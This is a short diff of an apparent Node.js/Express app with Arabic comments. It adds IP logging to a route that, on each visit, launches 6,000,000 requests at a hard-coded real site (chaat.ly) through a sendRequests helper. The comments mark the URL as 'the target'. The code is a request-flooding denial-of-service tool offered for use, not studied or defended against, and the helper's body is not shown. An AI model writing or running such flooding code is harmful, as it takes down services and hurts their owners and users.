@@ -22,6 +22,7 @@ const sendRequests = async (url, times, interval) => {
 
 // نقطة النهاية تعمل تلقائيًا عند زيارة الرابط
 app.get("/send-requests", async (req, res) => {
+  console.log(req.ip)
   const targetUrl =
     "https://chaat.ly"; // استبدلها بالرابط الهدف
   const totalRequests = 6000000; // عدد الطلبات
